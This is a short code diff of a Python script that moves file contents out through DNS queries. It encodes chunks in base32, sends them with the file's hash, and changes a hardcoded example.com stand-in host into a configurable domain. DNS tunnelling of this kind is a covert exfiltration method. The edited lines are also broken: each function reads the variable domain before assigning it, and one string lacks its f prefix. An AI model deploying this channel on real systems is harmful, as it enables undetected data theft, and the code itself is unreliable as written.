@@ -25,18 +25,18 @@ def send_dns_query(domain):
 
 def send_file_info(file_name, file_md5):
     """Sends the file name and its MD5 hash to the server."""
-    domain = f"{file_name}.{file_md5}.fileinfo.fileupload.example.com"
+    domain = f"{file_name}.{file_md5}.fileinfo.{domain}"
     send_dns_query(domain)
 
 def send_chunk(chunk, sequence_number):
     """Sends a chunk of the file as a DNS query."""
     encoded_chunk = base64.b32encode(chunk).decode('utf-8')
-    domain = f"{encoded_chunk}.chunk{sequence_number}.fileupload.example.com"
+    domain = f"{encoded_chunk}.chunk{sequence_number}.{domain}"
     send_dns_query(domain)
 
 def send_end_of_transmission():
     """Sends a special DNS query to signal the end of the file transmission."""
-    domain = "end.chunk999.fileupload.example.com"
+    domain = "end.chunk999.{domain}"
     send_dns_query(domain)
 
 # Calculate the MD5 hash of the file
